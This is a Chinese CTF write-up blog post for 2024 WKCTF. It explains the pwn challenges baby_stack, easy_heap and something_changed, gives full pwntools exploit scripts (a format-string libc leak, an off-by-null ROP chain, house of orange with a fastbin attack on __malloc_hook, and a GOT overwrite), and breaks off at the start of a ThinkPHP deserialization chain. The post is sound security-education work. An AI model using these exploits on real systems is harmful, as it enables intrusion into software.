<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="viol1t">





<title>2024年WKCTF-wp | viol1t</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2024年WKCTF-wp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">七月 17, 2024&nbsp;&nbsp;1:48:21</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/WP/">WP</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <img src="/2024/07/17/2024%E5%B9%B4WKCTF-wp/07/17/2024%E5%B9%B4WKCTF-wp/image-20240714185335025.png" class>

<p>题目下载地址：<a target="_blank" rel="noopener" href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF</a></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">wait</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">5</span>]; <span class="comment">// [rsp+Bh] [rbp-85h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">120</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Press enter to continue&quot;</span>);</span><br><span class="line">  getc(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pick a number: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">5</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  num = strtol(s, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(format, <span class="number">0x64</span>uLL, <span class="string">&quot;Your magic number is: %%%d$llx\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  introduce();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">echo_inner</span><span class="params">(_BYTE *a1, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  a1[(<span class="type">int</span>)fread(a1, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You said:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;110.40.35.73&#x27;</span>, <span class="number">33688</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;continue&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;number&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;is: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x3ec7e3</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.27/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x10a2fc</span>]</span><br><span class="line">ogg = one[<span class="number">1</span>] + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000008aa</span> + libc_base</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;256)? &#x27;</span>, <span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">p = p64(ret) * <span class="number">31</span> + p64(ogg)</span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  _DWORD size[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  size[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> ( size[<span class="number">0</span>] &gt; <span class="number">0x1000</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too large&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, chunk_ptr[index], size[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *(_QWORD *)&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p>
<p>伪造<code>top chunk</code>的条件：</p>
<ul>
<li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li>
<li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li>
<li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li>
<li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li>
</ul>
<p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p>
<p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;110.40.35.73&#x27;</span>, <span class="number">33747</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xdf8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x1e1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(p), p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xdf8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1b8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3c4b61</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.23/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">ogg = libc_base + one[<span class="number">3</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x1e1</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(p), p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x148</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0xdf8</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x148</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="built_in">len</span>(p), p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">19</span> + p64(ogg))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+FCCh] [xbp+2Ch]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [xsp+FD0h] [xbp+30h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [xsp+FF8h] [xbp+58h]</span></span><br><span class="line"></span><br><span class="line">  v7 = _bss_start;</span><br><span class="line">  read(<span class="number">0</span>, v6, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">strlen</span>(v6) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)(<span class="type">unsigned</span> __int8)v6[i] == <span class="string">&quot;$&quot;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-aarch64 -L ./libc/libc/lib ./pwn        </span><br><span class="line"><span class="meta prompt_">aaaaaaaa-%</span><span class="language-bash">p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span></span><br><span class="line">aaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-(nil)-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;120.79.91.95&#x27;</span>, <span class="number">3332</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p = fmtstr_payload(<span class="number">14</span>, &#123;<span class="number">0x411018</span>:<span class="number">0x400770</span>&#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">r.send(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h3><p>GET参数s</p>
<p>内网ip地址: <code>10.40.35.73</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title 